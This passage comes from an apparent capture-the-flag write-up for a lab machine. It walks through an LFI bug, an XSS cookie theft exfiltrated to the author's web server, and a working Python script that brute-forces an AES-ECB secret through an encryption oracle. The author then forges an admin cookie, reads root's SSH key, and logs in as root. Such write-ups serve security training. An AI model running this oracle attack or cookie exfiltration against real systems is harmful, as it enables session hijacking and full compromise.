  inflating: flask-backup/static/dist/images/pricing-illustration.svg
  inflating: flask-backup/static/dist/images/cta-illustration.svg
  inflating: flask-backup/static/dist/images/logo.svg
   creating: flask-backup/static/dist/css/
  inflating: flask-backup/static/dist/css/style.css
   creating: flask-backup/static/dist/js/
  inflating: flask-backup/static/dist/js/main.min.js
  inflating: flask-backup/static/download.svg
 extracting: flask-backup/__init__.py
  inflating: flask-backup/app.py
   creating: flask-backup/templates/
  inflating: flask-backup/templates/index.html
  inflating: flask-backup/templates/login.html
  inflating: flask-backup/templates/admin.html
```

Looking at `app.py` the zip seems to indeed contain the code of the application running on port 8088. Interestingly the LFI vulnerability does still exist in this application, however this time we need to be authenticated first.

`app.py`
```py
...[snip]...
@app.route("/admin/view/<path:log_path>")
def logs_view(log_path):

    if not hasattr(g,"is_admin") or not g.is_admin:
        resp = make_response()
        resp.headers['Location'] = '/admin'
        return resp, 302

    try:
        path = LOG_PATH + log_path
        with open(path, 'r') as file:
            data = file.read()
            return data
    except Exception as e:
        print(str(e))
        return "No such log found!"

    return None
...[snip]...
```

Looking at the code that handles the `is_admin` value we can see that the cookie `user_id` get's decrypted each request. The result is then split at `"," + SECRET + ","` and the second value has to equal `true` for `is_admin` to be true.

`app.py`
```py
...[snip]...
@app.before_request
def load_user():
    uid = request.cookies.get('user_id')

    try:
        g.uid = decrypt(uid)
        print("decrypted to " + g.uid)
        split = g.uid.split("," + SECRET + ",")
        if g.uid:
            g.name = split[0]
            g.is_admin = split[1] == "true"
    except Exception as e:
        print(str(e))
...[snip]...
```

Encryption is being done with AES in ECB mode and a blocksize of 16 bytes.

`app.py`
```py
...[snip]...
cryptor = AES.new(KEY, AES.MODE_ECB)

def decrypt(data):
    result = cryptor.decrypt(data.decode("hex"))
    pad_len = ord(result[-1])
    return result[:-pad_len]

def encrypt(data):
    # do some padding
    block_size = 16
    pad_size = block_size - len(data) % block_size
    padding = chr(pad_size) * pad_size
    data += padding
    return cryptor.encrypt(data).encode('hex')
...[snip]...
```

Another interesting part is the `/profile` route. Here we can update our username and retrieve a new cookie for it. Since we are able to continously encrypt chosen plaintext this way we can use this as an encryption oracle to break ECB and retrieve the `SECRET`.

`app.py`
```py
...[snip]...
@app.route("/profile", methods=["POST"])
def profile_update():

    if not hasattr(g,"uid") or not hasattr(g,"is_admin"):
        resp = make_response()
        resp.headers['Location'] = '/login'
        return resp, 302

    new_name = request.form.get('new_name')
    print(new_name)
    if not new_name or len(new_name) == 0:
        return "Error"

    e = new_name + "," + SECRET + "," + ("true" if g.is_admin else "false" )
    new_cookie = encrypt(e)

    resp = make_response()
    resp.headers['location'] = url_for('admin')
    resp.set_cookie("user_id", value=new_cookie)

    return resp, 302
...[snip]...
```

### Get valid cookie

To change our name we need a valid cookie first though. Looking at the `/login` route we see that the `http-only` flag on the `user_id` cookie is not getting set.

`app.py`
```py
...[snip]...
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == 'POST':
        user = do_auth()
        if user:
            e = user[0].encode("utf-8") + "," + SECRET + "," + ("true" if user[2] else "false" )

            print("setting cookie to "+ e)
            resp = make_response()
            resp.set_cookie("user_id", value=encrypt(e))
            resp.headers['location'] = url_for('admin')
            return resp, 302

    return show_login()
...[snip]...
```

This means we might be able to retrieve the cookie with the earlier discovered XSS. To capture it we first set up our python web server again.

```
$ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

We send the payload in burp and after some time we get a hit back on our web server with the cookie.

[![130_burp_cookie_grabber](/img/fingerprint/130_burp_cookie_grabber.png)](/img/fingerprint/130_burp_cookie_grabber.png)

```
$ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.227.226 - - [09/Dec/2021 14:35:10] code 404, message File not found
10.129.227.226 - - [09/Dec/2021 14:35:10] "GET /exfil?c=user_id=49f5f0062780bed62dc06bf4a8d2dd9cb5c3fda50e19a5a840262c26c001bb0338550635d9fd36fef81113d9fbd15805193308e099ee214406b0a87c0b6587fb HTTP/1.1" 404 -
```

Trying to use this cookie we see that the current user does not have `is_admin` set to true.

[![135_no_logs](/img/fingerprint/135_no_logs.png)](/img/fingerprint/135_no_logs.png)

### Brute secret

To abuse the weekness in ECB that same plaintext blocks result in the same ciphertext blocks we can adjust this [script](https://medium.com/@hva314/breaking-the-already-broken-aes-ecb-848b358cbc7) to perform the brute force attack. The one thing we change is the length of the blocks to bruteforce over. Since a cookie with a 1 character username is 64 bytes, the `,` take up 2 bytes and `false` are 5 bytes the secret takes up at least 3 blocks. So by choosing a length of 64 and covering 4 blocks we will we able to brute it in one run.

`brute_web.py`
```py
import requests
import string
s = requests.session()

def blocks(x):
    element = []
    for i in range(0, len(x),64):
        element.append(x[i:i+64])
    return element

def check_cookie(payload):
    s.cookies.clear()
    s.cookies.set("user_id", "49f5f0062780bed62dc06bf4a8d2dd9cb5c3fda50e19a5a840262c26c001bb0338550635d9fd36fef81113d9fbd15805193308e099ee214406b0a87c0b6587fb")
    r = s.post(
            "http://127.0.0.1:8088/profile",
            data={ "new_name": payload},
            allow_redirects=False
    )

    cookie = s.cookies.get_dict()['user_id']
    return blocks(cookie)

key = ''


while True:
    for c in string.printable:
        print(f'Current: {key + c}', end='\r', flush=True)
        payload = '_'*(63-len(key)) + key + c + '_'*(63-len(key))

        data = check_cookie(payload)
        if (data[1] == data[3]):
            key += c
            break
```

Running the script we are able to retrieve the secret `7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr453!!!` for the application.

```
$ python brute_web.py
Current: ,7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr453!!!,false
```

With this we can now generate cookies for any user we want with `is_admin` being set to true. Sending the request in burp to `/profile` we use the resulting cookie to abuse the LFI again.

[![140_gen_cookie](/img/fingerprint/140_gen_cookie.png)](/img/fingerprint/140_gen_cookie.png)

We could read the root flag now already since the application is running as root, but it is more satisfying to get an actual root shell. Luckily for us root has a private ssh key which we are able to read through the LFI.

[![145_get_root_key](/img/fingerprint/145_get_root_key.png)](/img/fingerprint/145_get_root_key.png)

Now we can ssh into the machine and add the rootflag to our collection.

```
$ ssh -i root root@10.129.227.226
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-163-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Dec  9 14:52:33 UTC 2021

  System load:  0.0               Processes:           179
  Usage of /:   71.2% of 6.82GB   Users logged in:     2
  Memory usage: 33%               IP address for eth0: 10.129.227.226
  Swap usage:   1%


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Dec  9 12:51:45 2021 from 10.10.14.94
root@fingerprint:~# wc -c root.txt
33 root.txt
```